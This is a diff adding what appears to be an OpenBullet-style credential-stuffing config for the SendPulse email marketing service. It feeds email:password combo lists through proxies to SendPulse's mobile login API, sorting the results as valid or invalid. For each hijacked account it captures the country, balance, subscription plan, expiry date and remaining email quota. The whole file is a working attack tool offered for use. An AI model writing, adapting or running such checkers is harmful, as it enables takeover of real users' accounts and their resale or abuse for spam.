@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Sendpulse",
+  "SuggestedBots": 58,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-22T17:29:44.4220464+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#AuthToken FUNCTION Base64Encode "{\"login\":\"<USER>\",\"lang\":\"en\",\"password\":\"<PASS>\"}" -> VAR "AuthToken" 
+
+#Login_Post REQUEST POST "https://login.sendpulse.com/api/email/3.0/getaccount" 
+  CONTENT "userapp=mobileapp&params=<AuthToken>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.sendpulse.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: /" 
+  HEADER "User-Agent: SendPulse/1.3.11 CFNetwork/1312 Darwin/21.0.0" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Login_Check KEYCHECK 
+  KEYCHAIN Retry OR 
+    KEY "{\"error\":101}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":105}" 
+    KEY "{\"error\":104}" 
+  KEYCHAIN Success AND 
+    KEY "email" 
+    KEY "id" 
+    KEY "result" 
+
+#Currency PARSE "<SOURCE>" LR "\",\"currency\":\"" "\"," -> VAR "Currency" 
+
+#Country PARSE "<SOURCE>" LR "\"country\":\"" "\"," -> CAP "Country" 
+
+#Balance PARSE "<SOURCE>" LR "\",\"balance\":" ",\"" -> CAP "Balance" "" " <Currency>" 
+
+#Subscription PARSE "<SOURCE>" LR "\",\"tariff_name\":\"" "\"," -> CAP "Subscription" 
+
+#Expiration PARSE "<SOURCE>" LR "\",\"tariff_end_date\":\"" "\"," -> CAP "Expiration" 
+
+#Email's_Total_Quantity PARSE "<SOURCE>" LR "\",\"emails_quantity_all\":" ",\"" -> CAP "Email's Total Quantity" 
+
+#Email's_Quantity_Left PARSE "<SOURCE>" LR ",\"emails_quantity_left\":" "}" -> CAP "Email's Quantity Left" 
+
+#Expiration_Format FUNCTION Replace "." "-" "<Expiration>" -> VAR "unixsub" 
+
+#Expiration_unix FUNCTION DateToUnixTime "dd-MM-yyyy" "<unixsub>" -> VAR "subunix" 
+
+#CurrentUnixTime FUNCTION CurrentUnixTime -> VAR "unix" 
+
+#Free_Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Balance>" Contains "0 <Currency>" 
+    KEY "<Subscription>" Contains "Free" 
+  KEYCHAIN Custom "EXPIRED" AND 
+    KEY "<subunix>" LessThan "<unix>" 
+    KEY "<Balance>" Contains "0 <Currency>" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<Email's Quantity Left>" EqualTo "0" 
+    KEY "<Balance>" Contains "0 <Currency>" 
+
